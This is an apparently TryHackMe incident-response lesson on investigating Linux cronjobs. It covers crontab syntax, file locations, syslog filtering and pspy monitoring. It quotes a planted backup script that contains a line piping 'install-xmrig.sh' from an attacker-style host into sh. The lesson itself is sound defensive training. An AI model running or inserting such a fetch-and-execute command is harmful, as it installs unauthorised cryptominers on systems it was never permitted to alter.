Cronjobs are scheduled tasks executed automatically at predefined intervals by the **cron daemon**. The cron daemon is a background process responsible for managing cronjobs based on configuration files known as crontabs. Users can have their crontab file stored in the `/var/spool/cron/crontabs` directory. The main crontab file at `/etc/crontab` governs system-wide cronjobs.

Below is a brief refresher on cronjobs and their syntax. For a more detailed look into Linux cronjobs, go through the [Linux Fundamentals Part 3](https://tryhackme.com/room/linuxfundamentalspart3) room.

Cron entries follow a specific format consisting of space-separated fields. Let's first look at an example crontab file for a user named **Bob**. Typically, this file would be located in `/var/spool/cron/crontabs/bob`:

Example Cron Entry

```shell-session
10 05 * * * /home/bob/backup_tmp.sh
```

This cron schedule consists of five fields followed by the command to execute:

- **Minute (10):** The first field specifies the minute when the command will be executed. In this case, it's **10**, indicating that the command will be executed at the 10th minute of the hour.
- **Hour (05):** The second field specifies the hour when the command will be executed. It's **05**, indicating that the command will be executed at 5:10 AM.
- **Day of the Month (*):** The third field specifies the day of the month when the command will be executed. In this case, it's *****, a wildcard value, meaning it will be executed every day of the month. You can also specify a specific day of the month using numbers from 1 to 31. For example, to execute the command on the 15th day of every month, you would use **15**.
- **Month (*):** The fourth field specifies the month when the command will be executed. Here, it's also *****, meaning the command will be executed monthly. You can specify months using either numbers (1 for January, 2 for February, etc.) or shorthand names (**Jan** for January, **Feb** for February, etc.). For example, you can use either **2** or **Feb** to execute the command only in February.
- **Day of the Week (*):** The fifth field specifies the day of the week the command will be executed. In this case, it's *****, which means the command will be executed every day of the week. You can also specify days of the week using numbers from 0 to 7, where 0 and 7 represent Sunday, 1 represents Monday, and so on. Alternatively, you can use the shorthand names (Sun, Mon, Tue, etc.). For example, you can use either **1** or **Mon**.
- **Command (**`/home/bob/backup_tmp.sh`**):** The final field contains the command to be executed.

Additionally, it's important to note that the system-level `/etc/crontab` differs from user-level crontabs. System-wide crontabs will include an additional field specifying the user under which the command will run (i.e., _root_ or _www-data_).

Putting it all together, the cron schedule is configured to execute the command `/home/bob/backup_tmp.sh` at 5:10 AM every day.

For thorough documentation on reading and creating Cron expressions, check out [Crontab Guru](https://crontab.guru/).

Cronjobs, while essential for automating tasks, can also be a target for attackers seeking to establish persistence or escalate privileges on a system. Therefore, it's crucial for incident responders and forensic analysts to know how to analyse the system for any suspicious cronjobs or scheduled tasks.

Cron Configuration Files

We can begin our investigation into cronjobs on the system by first taking inventory of the system's cron configuration files. Fortunately, this process is relatively straightforward as these files are typically stored in known locations.

**/etc/crontab**

Firstly, let's focus on `/etc/crontab`, the main repository for system-wide cronjobs. Administrators can configure tasks that require elevated privileges within this file, often executing commands as the root user. To view this file, we can `cat` its contents:

Viewing /etc/crontab

```shell-session
investigator@tryhackme:~$ cat /etc/crontab
...
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
...
*/5 * * * * root /var/tmp/backup
```

The above contents of `/etc/crontab` show the default shell and path variables used to execute commands. Below that, we can see a single cronjob entry:

`*/5 * * * * root /var/tmp/backup`

By reading the syntax above, we can determine that the `/var/tmp/backup` file will execute every five minutes as root. The `*/5` is a way within cron's syntax to specify every fifth minute.

This finding invokes immediate suspicion as a system-level cronjob executes a command with root privileges in the `/var/tmp` directory. This is a world-writable directory, meaning that any user can modify or replace the `backup` file that is being executed. This could be a misconfiguration that an attacker abused to escalate privileges or a persistence method created by the attacker after gaining root access to the system.

When viewing the contents of this `backup` file, we can determine suspicious additions to the script:

Viewing the Contents of /var/tmp/backup

```shell-session
investigator@tryhackme:~$ cat /var/tmp/backup
#!/bin/bash

tar -czf web_backup.tar.gz /var/www/html && curl -sSL http://h4x0rcr7pt.thm/install-xmrig.sh | sh
```

Although the backup script initially appears to perform a legitimate backup operation, an additional command has been appended to download and execute an install script via `curl`. From the name of the script, it appears to be related to the XMRig cryptocurrency mining software and warrants further investigation. This example illustrates a common tactic attackers use to leverage compromised systems for unauthorised cryptocurrency mining.

Next, additional system cronjob directories are important for a thorough analysis. These directories are found under the `/etc/` directory with the following naming convention:

- **/etc/cron.hourly/** - System cronjobs that run once per hour.
- **/etc/cron.daily/** - System cronjobs that run once per day.
- **/etc/cron.weekly/** - System cronjobs that run once per week.
- **/etc/cron.monthly/** - System cronjobs that run once per month.
- **/etc/cron.d/** - Additional custom system cronjobs.

With these locations in mind, we can list out any configured cronjobs with the `ls` command:

Listing Additional Cronjobs

```shell-session
investigator@tryhackme:~$ ls /etc/cron.d
anacron  e2scrub_all  popularity-contest
investigator@tryhackme:~$ ls /etc/cron.hourly
beacon
investigator@tryhackme:~$ ls /etc/cron.daily
0anacron  apt-compat    cracklib-runtime  logrotate  popularity-contest
apport    bsdmainutils  dpkg              man-db     update-notifier-common
investigator@tryhackme:~$ ls /etc/cron.weekly
0anacron  man-db  update-notifier-common
investigator@tryhackme:~$ ls /etc/cron.monthly
0anacron
```

In the output above, most of these cronjobs look benign - however, it's always important to investigate their contents to be sure. Similar to processes, this is why it's always essential to have a pre-established baseline in order to spot anomalies quickly.

**/var/spool/cron/crontabs/**

After investigating the system-level cronjobs, we can look at the various user-level cronjobs configured by users on the system. User-level cronjobs are specific to individual user configuration files and are managed independently of system-wide cronjobs. We can navigate to the `/var/spool/cron/crontabs/` directory. Each user with permission to use cron will have their file inside this directory, named after their username.

There are several ways to enumerate this information. The easiest way is to list the contents of the directory with sudo-privileges:

Listing User-Level Cronjobs

```shell-session
investigator@tryhackme:~$ sudo ls -al /var/spool/cron/crontabs/
total 28
drwx-wx--T 2 root   crontab 4096 Mar 13 00:05 .
drwxr-xr-x 5 root   root    4096 Oct 26  2020 ..
-rw------- 1 bob    crontab 1157 Mar 13 00:05 bob
-rw------- 1 elijah crontab 1122 Mar 13 00:02 elijah
-rw------- 1 janice crontab 1132 Mar 12 23:38 janice
-rw------- 1 root   crontab 1122 Mar 12 23:45 root
-rw------- 1 ubuntu crontab 1225 Feb 27  2022 ubuntu
```

As seen in the above output, user-level cronjobs have been configured by several users on the system.

We can view the contents of these files separately (using `cat`) to analyse their contents, or we could use the `crontab` command. This command can manage, create, or view user-level cronjobs. The `-u` argument can be used to specify a specific user's cron configuration, and the `-l` argument can be used to display the contents of the cronjob. To view **Janice**'s cronjobs, we can run:

Viewing Janice's Configured Cronjobs

```shell-session
investigator@tryhackme:~$ sudo crontab -l -u janice
...
# m h  dom mon dow   command
* * * * * /home/janice/abzkd83o4jakxld.sh
```

As seen in the above output, we have discovered the specific cronjob that executes the `abzkd83o4jakxld.sh` bind shell, which we identified in the previous task.

Using a clever one-liner command, we can quickly loop through the users on the system and identify if they have any user-level cronjobs configured. If so, we can output the contents of the cronjob entry to the terminal. This type of hybrid automation can help speed up investigations and ensure thorough coverage:

Using a One-Liner to List User Cron Entries

```shell-session
investigator@tryhackme:~$ sudo bash -c 'for user in $(cut -f1 -d: /etc/passwd); do entries=$(crontab -u $user -l 2>/dev/null | grep -v "^#"); if [ -n "$entries" ]; then echo "$user: Crontab entry found!"; echo "$entries"; echo; fi; done'
...
janice: Crontab entry found!
* * * * * /home/janice/abzkd83o4jakxld.sh

bob: Crontab entry found!
10 05 * * * /home/bob/backup_tmp.sh
30 04 * * * /var/tmp/findme.sh
...
```

To break down this command, we are iterating over all of the users on the system by filtering out the entries in `/etc/passwd`. From each of these returned users, it iterates each user and fetches their crontab entries using the `crontab` command we ran earlier. If a crontab entry exists for that user, we will return their username and the entry from the crontab file.

As seen in the above output, we have quickly determined the values of multiple users' crontab entries.

Cron Execution Logs

Cron logs record the execution of scheduled tasks managed by the cron daemon and provide a chronological record of when cron jobs were executed, along with any associated output or error messages. From a forensic standpoint, these logs can be invaluable in uncovering execution artefacts of cronjobs and lead to discovering suspicious activities or system compromises. For example, suppose a malicious actor abused an existing cronjob or created a malicious cronjob and attempted to cover their tracks. In that case, the logs might reveal unusual patterns of execution or unexpected commands being run.

On Debian-based systems, cron execution logs are typically stored in `/var/log/syslog`. This file aggregates system logs, including messages from the cron daemon. In some Linux distributions, such as Red Hat Enterprise Linux (RHEL) and CentOS, these logs may be found in the aptly named `/var/log/cron`.

Because the system we're investigating stores cron logs in the **syslog** file, we can `grep` the contents and filter for any logs related to cron:

Filtering Syslog for Cron Logs

```shell-session
investigator@tryhackme:~$ sudo grep cron /var/log/syslog
```

The above command will produce a large amount of output. It is a good idea to filter the results further based on specific criteria to focus on relevant information. Some example ideas to filter on include:

Filtering Syslog for Failed Cron Logs

```shell-session
investigator@tryhackme:~$ sudo grep cron /var/log/syslog | grep -E 'failed|error|fatal'
```

The above command will filter out cron entries associated with failed job executions. In this case, there are no results - but this can be a useful method to catch anomalies.

We can also filter for specific users:

Filtering Syslog for Bob's Cron Logs

```shell-session
investigator@tryhackme:~$ sudo grep cron /var/log/syslog | grep -i 'bob'
Mar 13 00:04:35 tryhackme crontab[3016]: (root) LIST (bob)
Mar 13 00:05:17 tryhackme crontab[3053]: (bob) BEGIN EDIT (bob)
Mar 13 00:05:45 tryhackme crontab[3053]: (bob) END EDIT (bob)
Mar 13 00:05:47 tryhackme crontab[3058]: (bob) BEGIN EDIT (bob)
Mar 13 00:05:59 tryhackme crontab[3058]: (bob) REPLACE (bob)
Mar 13 00:05:59 tryhackme crontab[3058]: (bob) END EDIT (bob)
Mar 13 00:06:01 tryhackme cron[704]: (bob) RELOAD (crontabs/bob)
Mar 13 00:06:32 tryhackme crontab[3259]: (root) LIST (bob)
```

The above command will filter cron entries specifically associated with **Bob**. Note that in the above output, we can even see the timestamps of when Bob's crontab file was modified.

Pspy

[Pspy](https://github.com/DominicBreuker/pspy) is a powerful open-source tool used to monitor Linux processes without the need for root privileges. It is designed to capture and display real-time information about running processes, including their execution commands, user IDs, process IDs (PIDs), parent process IDs (PPIDs), timestamps, and other relevant details. It operates by reading data directly from the `/proc` virtual filesystem, providing real-time insights into process activity without modifying system files or requiring elevated permissions.

While it's excellent for enumeration purposes, incident responders can benefit from its ability to collect execution artefacts and catch short-lived processes. Due to its real-time monitoring, it can also detect processes generated by various cronjobs through the system, giving us more insight into which processes occur when cronjobs are run.

In this system, Pspy has been pre-installed along with the mounted binaries we have been using. As such, it is in our path and can be called simply by running `pspy64`. It will begin to monitor in real time, and we should let it run for a few minutes to capture events. It can be stopped by pressing `Ctrl + C`:

Using pspy64 to Monitor Executions

```shell-session
investigator@tryhackme$ pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)

Draining file system events due to startup...
done
...
2024/03/13 19:38:45 CMD: UID=0     PID=1      | /sbin/init 
2024/03/13 19:39:01 CMD: UID=0     PID=3396   | /usr/sbin/CRON -f 
2024/03/13 19:39:01 CMD: UID=1003  PID=3403   | /bin/bash /home/janice/abzkd83o4jakxld.sh 
2024/03/13 19:39:01 CMD: UID=1003  PID=3402   | /bin/sh -i 
2024/03/13 19:39:01 CMD: UID=1003  PID=3401   | /bin/bash /home/janice/abzkd83o4jakxld.sh
```

**Note:** The output may appear stalled or paused for a few moments as it initialises.

This command will produce a large amount of continuous output as normal system operations occur. However, we can quickly note that the cronjobs on the system that we identified previously (such as `/bin/bash /home/janice/abzkd83o4jakxld.sh`) are detected.